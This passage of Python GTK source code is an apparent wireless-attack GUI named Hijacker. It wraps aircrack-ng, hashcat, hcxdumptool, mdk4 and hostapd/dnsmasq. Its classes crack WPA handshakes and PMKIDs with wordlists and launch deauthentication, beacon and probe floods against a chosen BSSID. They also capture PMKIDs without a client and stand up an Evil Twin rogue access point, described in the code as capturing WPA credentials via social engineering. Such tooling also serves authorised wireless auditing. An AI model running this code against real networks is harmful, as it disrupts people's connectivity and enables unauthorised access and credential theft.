            # airmon-ng may rename back; try common names
            for name in [iface + 'mon', iface]:
                Functions.execute_cmd(f'ip link set {name} down 2>/dev/null')
                Functions.execute_cmd(f'iw dev {name} set type managed 2>/dev/null')
                Functions.execute_cmd(f'ip link set {name} up 2>/dev/null')
            widget.set_label('Start Monitor')
            widget.get_style_context().remove_class('suggested-action')
        else:
            # Start monitor mode
            Functions.execute_cmd(f'airmon-ng check kill')
            Functions.execute_cmd(f'airmon-ng start {iface}')
            widget.set_label('Stop Monitor')
            widget.get_style_context().add_class('suggested-action')


class Hashcat(Functions):
    """Crack WPA handshakes or PMKID hashes with hashcat (GPU-accelerated)."""
    def __init__(self, builder):
        self.hc_cap       = builder.get_object('hc_cap_chooser')
        self.hc_wordlist  = builder.get_object('hc_wordlist_chooser')
        self.hc_mode_combo= builder.get_object('hc_mode_combo')
        self.hc_btn       = builder.get_object('hc_btn')
        self.hc_output    = builder.get_object('hc_output')
        self._proc = None

    def run(self):
        if self.hc_btn:
            self.hc_btn.connect('clicked', self._toggle)

    def _log(self, text):
        def _do():
            buf = self.hc_output.get_buffer()
            buf.insert(buf.get_end_iter(), text + '\n')
            return False
        GLib.idle_add(_do)

    def _toggle(self, widget):
        if self._proc and self._proc.poll() is None:
            self._proc.terminate()
            self._proc = None
            widget.set_label('Start Hashcat')
            return
        cap  = self.hc_cap.get_filename() if self.hc_cap else None
        wl   = self.hc_wordlist.get_filename() if self.hc_wordlist else None
        mode = self.hc_mode_combo.get_active_text() if self.hc_mode_combo else 'WPA-PMKID (22000)'
        if not cap:
            self._log('[!] Select a .hc22000 or .cap file first.')
            return
        if not wl:
            self._log('[!] Select a wordlist.')
            return

        # Convert .cap to hashcat format if needed
        hash_file = cap
        if cap.endswith('.cap') or cap.endswith('.pcap'):
            hash_file = '/tmp/hashcat_input.hc22000'
            self._log('[*] Converting .cap → hc22000 with hcxtools...')
            r = subprocess.run(['hcxpcapngtool', '-o', hash_file, cap],
                               capture_output=True, text=True)
            if r.returncode != 0 or not os.path.exists(hash_file):
                # fallback: try hcxtools older name
                r2 = subprocess.run(['hcxpcaptool', '-z', hash_file, cap],
                                    capture_output=True, text=True)
                if r2.returncode != 0:
                    self._log('[!] hcxpcapngtool/hcxpcaptool not found. Install hcxtools.')
                    self._log('[*] Falling back to aircrack-ng dictionary mode...')
                    cmd = ['aircrack-ng', '-w', wl, cap]
                    self._proc = subprocess.Popen(
                        cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                        universal_newlines=True, bufsize=1)
                    widget.set_label('Stop')
                    threading.Thread(target=self._stream, args=(widget,), daemon=True).start()
                    return

        hc_mode = '22000'   # WPA-PMKID-PBKDF2 (covers both PMKID and handshake)
        cmd = ['hashcat', '-m', hc_mode, hash_file, wl,
               '--force', '--status', '--status-timer=5',
               '-O',  # optimized kernels
               '--potfile-path=/tmp/hashcat.pot']
        self._log(f'[*] Hashcat: {" ".join(cmd)}')
        self._proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            universal_newlines=True, bufsize=1)
        widget.set_label('Stop')
        threading.Thread(target=self._stream, args=(widget,), daemon=True).start()

    def _stream(self, widget):
        for line in self._proc.stdout:
            line = line.rstrip()
            if line:
                self._log(line)
            if 'Cracked' in line or 'KEY FOUND' in line or 'Status.......:' in line:
                pass  # keep streaming
        self._log('[*] Hashcat finished.')
        GLib.idle_add(widget.set_label, 'Start Hashcat')
        self._proc = None


class MDK4(Functions):
    """MDK4 attacks: beacon flood, deauth, EAPOL spam, Probe flood."""
    def __init__(self, builder):
        self.mdk4_mode   = builder.get_object('mdk4_mode_combo')
        self.mdk4_toggle = builder.get_object('mdk4_toggle')
        self.mdk4_target = builder.get_object('mdk4_target_entry')
        self._proc = None

    def run(self):
        if self.mdk4_toggle:
            self.mdk4_toggle.connect('state-set', self._toggle)

    def _toggle(self, switch, state):
        iface = Functions.read_config().get('interface', '')
        if not iface:
            return
        if state:
            mode_text = self.mdk4_mode.get_active_text() if self.mdk4_mode else 'b'
            target = self.mdk4_target.get_text().strip() if self.mdk4_target else ''
            # Map friendly names to mdk4 modes
            mode_map = {
                'Beacon Flood (b)': 'b',
                'Deauth / Disassoc (d)': 'd',
                'EAPOL Logoff (e)': 'e',
                'Probe Flood (p)': 'p',
                'AMOK Deauth (a)': 'a',
            }
            mode = mode_map.get(mode_text, 'b')
            cmd = f'mdk4 {iface} {mode} -s 1000'
            if target and mode in ('d', 'e', 'a'):
                cmd += f' -B {target}'
            self._proc = Functions.execute_cmd(cmd)
        else:
            Functions.terminate_processes('mdk4', '')
            if self._proc:
                try: self._proc.terminate()
                except Exception: pass
                self._proc = None


class PMKID(Functions):
    """PMKID clientless attack via hcxdumptool — no client needed."""
    def __init__(self, builder):
        self.pmkid_btn    = builder.get_object('pmkid_btn')
        self.pmkid_bssid  = builder.get_object('pmkid_bssid_entry')
        self.pmkid_time   = builder.get_object('pmkid_time_entry')
        self.pmkid_output = builder.get_object('pmkid_output')
        self._proc = None

    def run(self):
        if self.pmkid_btn:
            self.pmkid_btn.connect('clicked', self._toggle)

    def _log(self, text):
        def _do():
            buf = self.pmkid_output.get_buffer()
            buf.insert(buf.get_end_iter(), text + '\n')
            return False
        GLib.idle_add(_do)

    def _toggle(self, widget):
        if self._proc and self._proc.poll() is None:
            self._proc.terminate()
            self._proc = None
            widget.set_label('Capture PMKID')
            self._log('[*] Stopped.')
            return

        iface = Functions.read_config().get('interface', '')
        if not iface:
            self._log('[!] No interface configured.')
            return

        bssid  = self.pmkid_bssid.get_text().strip() if self.pmkid_bssid else ''
        t_secs = self.pmkid_time.get_text().strip() if self.pmkid_time else '30'
        try:
            t_secs = int(t_secs)
        except ValueError:
            t_secs = 30

        out_file = '/tmp/pmkid_capture.pcapng'
        # hcxdumptool 7.x renamed most options.
        #   -o          → -w  (write pcapng)
        #   --active_beacon, --enable_status=15, --filterlist_ap,
        #   --filtermode → removed. Filtering is now done through the
        #     Berkeley Packet Filter (--bpfc/--bpf) — compile a filter
        #     file for the target BSSID if the user supplied one.
        # See https://github.com/ZerBea/hcxdumptool/blob/master/docs/upgrade_from_6.md
        cmd = ['hcxdumptool', '-i', iface, '-w', out_file,
               '--rds=1']   # rds=1 gives a friendly real-time display
        if bssid:
            # Compile a BPF that only captures frames to/from that BSSID
            # and write it as an input file for --bpf.
            mac_flat = bssid.replace(':', '').lower()
            bpf_file = '/tmp/pmkid_filter.bpf'
            try:
                compile_out = subprocess.check_output(
                    ['hcxdumptool',
                     f'--bpfc=wlan addr3 {mac_flat}'],
                    text=True, timeout=5)
                with open(bpf_file, 'w') as f:
                    f.write(compile_out)
                cmd += ['--bpf', bpf_file]
            except Exception as exc:
                self._log(f'[!] BPF compile failed ({exc}); '
                          'capturing without filter')

        # hcxdumptool 7.x insists on arming the interface itself: if it
        # is *already* in monitor mode when the tool starts, it aborts
        # with "failed to arm interface -- broken driver / shared
        # interface". Detected on ath10k_snoc + wlan0mon. Work around it
        # by dropping the interface back to managed briefly so
        # hcxdumptool can take exclusive control; we don't restore it,
        # because on capture-stop hcxdumptool leaves it in monitor mode
        # (which is what the rest of the app wants anyway).
        try:
            iw_type = subprocess.check_output(
                ['iw', 'dev', iface, 'info'],
                text=True, timeout=3)
            if 'type monitor' in iw_type:
                self._log(f'[*] {iface} is monitor -- flipping to managed '
                          'so hcxdumptool can rearm it (7.x quirk).')
                for step in (['ip', 'link', 'set', iface, 'down'],
                             ['iw', 'dev', iface, 'set', 'type', 'managed'],
                             ['ip', 'link', 'set', iface, 'up']):
                    subprocess.run(step, check=False, timeout=5)
        except Exception as exc:
            self._log(f'[!] Could not check/reset iface mode: {exc}')

        self._log(f'[*] hcxdumptool: {" ".join(cmd)}')
        self._log(f'[*] Capturing for {t_secs}s → {out_file}')

        widget.set_label('Stop')
        self._proc = subprocess.Popen(
            cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            universal_newlines=True, bufsize=1)

        def _run():
            import time
            start = time.time()
            for line in self._proc.stdout:
                line = line.strip()
                if line:
                    self._log(line)
                if time.time() - start > t_secs:
                    break
            try: self._proc.terminate()
            except Exception: pass
            self._log(f'\n[*] Capture saved to {out_file}')
            self._log('[*] Convert with: hcxpcapngtool -o hash.hc22000 ' + out_file)
            self._log('[*] Crack with hashcat tab (mode 22000) or:')
            self._log('    hashcat -m 22000 hash.hc22000 /usr/share/wordlists/rockyou.txt.gz')
            GLib.idle_add(widget.set_label, 'Capture PMKID')
            self._proc = None

        threading.Thread(target=_run, daemon=True).start()


class EvilTwin(Functions):
    """
    Evil Twin / Rogue AP: hostapd + dnsmasq open AP that serves a captive
    portal to capture WPA credentials via social engineering.
    Requires: hostapd, dnsmasq.
    """
    def __init__(self, builder):
        self.et_ssid    = builder.get_object('et_ssid_entry')
        self.et_iface2  = builder.get_object('et_iface2_entry')
        self.et_toggle  = builder.get_object('et_toggle')
        self.et_output  = builder.get_object('et_output')
        self._hostapd_p = None
        self._dnsmasq_p = None

    def run(self):
        if self.et_toggle:
            self.et_toggle.connect('state-set', self._toggle)

    def _log(self, text):
        def _do():
            buf = self.et_output.get_buffer()
            buf.insert(buf.get_end_iter(), text + '\n')
            return False
        GLib.idle_add(_do)

    def _toggle(self, switch, state):
        if state:
            self._start()
        else:
            self._stop()

    def _start(self):
        ssid   = self.et_ssid.get_text().strip() if self.et_ssid else 'FreeWiFi'
        iface2 = self.et_iface2.get_text().strip() if self.et_iface2 else 'wlan0'
        if not ssid:
            self._log('[!] Enter an SSID.')
            return

        # Write hostapd config
        hostapd_conf = f"""interface={iface2}
driver=nl80211
ssid={ssid}
hw_mode=g
channel=6
auth_algs=1
ignore_broadcast_ssid=0
"""
        with open('/tmp/evil_twin_hostapd.conf', 'w') as f:
            f.write(hostapd_conf)

        # Write dnsmasq config (DHCP + DNS redirect)
        dnsmasq_conf = f"""interface={iface2}
dhcp-range=192.168.66.10,192.168.66.100,255.255.255.0,12h
dhcp-option=3,192.168.66.1
dhcp-option=6,192.168.66.1
address=/#/192.168.66.1
"""
        with open('/tmp/evil_twin_dnsmasq.conf', 'w') as f:
            f.write(dnsmasq_conf)

        # Assign IP to the AP interface
        Functions.execute_cmd(f'ip addr flush dev {iface2}')
        Functions.execute_cmd(f'ip addr add 192.168.66.1/24 dev {iface2}')
        Functions.execute_cmd(f'ip link set {iface2} up')

        self._log(f'[*] Starting Evil Twin: SSID={ssid} iface={iface2}')
        self._log('[*] AP at 192.168.66.1 — all DNS → 192.168.66.1')
        self._log('[*] Clients will receive 192.168.66.x via DHCP')

        self._hostapd_p = subprocess.Popen(
            ['hostapd', '/tmp/evil_twin_hostapd.conf'],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            universal_newlines=True, bufsize=1)
        self._dnsmasq_p = subprocess.Popen(
            ['dnsmasq', '-C', '/tmp/evil_twin_dnsmasq.conf', '--no-daemon',
             '--log-queries', '--log-dhcp'],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
            universal_newlines=True, bufsize=1)

        def _stream(proc, tag):
            for line in proc.stdout:
                line = line.strip()
                if line:
                    self._log(f'[{tag}] {line}')

        threading.Thread(target=_stream, args=(self._hostapd_p, 'hostapd'), daemon=True).start()
        threading.Thread(target=_stream, args=(self._dnsmasq_p, 'dnsmasq'), daemon=True).start()

    def _stop(self):
        self._log('[*] Stopping Evil Twin...')
        for p in [self._hostapd_p, self._dnsmasq_p]:
            if p:
                try: p.terminate()
                except Exception: pass
        self._hostapd_p = None
        self._dnsmasq_p = None
        Functions.terminate_processes('hostapd', '')
        Functions.terminate_processes('dnsmasq', '')


class HijackerGUI(Gtk.Application):
    def __init__(self):
        Gtk.Application.__init__(self, application_id=AppDetails.appid)
        Gtk.Window.set_default_icon_name(AppDetails.applogo)

    def do_activate(self):
        builder = Gtk.Builder()
        builder.add_from_file(AppDetails.ui)

        # Initialize Functions
        MonitorMode(builder).run()
        Airodump(builder).run()
        Aircrack(builder).run()
        Hashcat(builder).run()
        MDK3(builder).run()
        MDK4(builder).run()
        WPS(builder).run()
        PMKID(builder).run()
        EvilTwin(builder).run()

        # Get The main window from the glade file
        main_window = builder.get_object('hijacker_window')
        main_window.set_title(AppDetails.name)
        main_window.set_default_size(400, 500)
        main_window.set_size_request(300, 400)

        # Show the main_window
        main_window.connect('destroy', Gtk.main_quit)
        main_window.show()

if __name__ == "__main__":
    nh = HijackerGUI().run(None)
    Gtk.main()
